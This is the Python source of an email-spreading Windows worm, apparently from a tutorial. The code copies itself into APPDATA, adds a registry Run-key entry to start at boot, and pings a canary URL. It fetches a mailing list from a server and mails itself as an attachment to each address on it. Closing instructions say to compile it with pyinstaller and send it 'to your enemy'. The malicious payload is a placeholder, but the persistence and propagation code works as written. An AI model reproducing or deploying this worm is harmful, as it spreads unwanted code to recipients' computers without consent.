#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os, sys
import shutil
import requests
from winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.application import MIMEApplication

def main():
    # Creating a clone
    dir = os.getenv("APPDATA") + r'/worm/' # You can put any name of the worm in the place of the worm
    path = dir + os.path.basename(__file__) #there will be a copy of the program, it will also run in the future
  
    if not os.path.exists(dir):
        os.makedirs(dir)
        shutil.copy(__file__, path)
    # we register it in the autorun, through the registry
    reestr_path = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, KEY_ALL_ACCESS)
    SetValueEx(reestr_path, 'worm', 0, REG_SZ, path)
    CloseKey(reestr_path)
  
    # Let's take a canary
    requests.get('http://canarytokens.com/feedback/01oohhr7cpup3uf0x44m0vol2/index.html')
  
    # we receive instructions from the server (in the case of this program, we receive a mailing list)
    instructions = requests.get('http://192.168.3.111/instruction.txt', stream=True) # getting a data file from the server
    with open('instruction.txt', 'wb') as f:
        shutil.copyfileobj(instructions.raw, f) # just in case, we save the instructions
  
    Execute() # we perform malicious actions
    SendMail(path) # we begin the process of self-reproduction and distribution

  
def Execute():
    """A function for performing malicious actions"""
    with open('README.txt', 'w', encoding='utf-8') as f:
        f.write('Belligerent worm in action')

def SendMail(path):
    """Creating an email with the attachment of the program and sending it to the users' soaps, in the list from the instructions"""
    # preparation of the letter data
    with open('instruction.txt', 'r') as f:
        for mail in f:
            if mail != None:
                FROM = "forwormpost@gmail.com"
                TO = mail
                msg = MIMEMultipart()
                msg['From'] = FROM
                msg['To'] = TO
                msg['Subject'] = 'worm'
              
                # file attachment
                with open(path, 'rb') as f:
                    part = MIMEApplication(f.read(), Name=os.path.basename(path))
                part['Content-Discription'] = 'attachment; filename="%s"' % os.path.basename(path)
              
                msg.attach(part)
              
                # Sending a letter
                smtpOBJ = smtplib.SMTP("smtp.gmail.com", 587)
                smtpOBJ.starttls()
                smtpOBJ.login(FROM, 'email password')
                smtpOBJ.sendmail(FROM, TO, msg.as_string())
                smtpOBJ.quit()

if __name__ == "__main__":
    main()

    That's all our virus is ready, now it remains to compile our worm with the command pyinstaller -F 'worm name'.py (this must be done on the command line and wait for the virus to compile. When the virus is fully compiled, you can send it to your enemy
    In order to run our virus, we must enter the canary into Kali Linux, if this is not done, the virus will not work
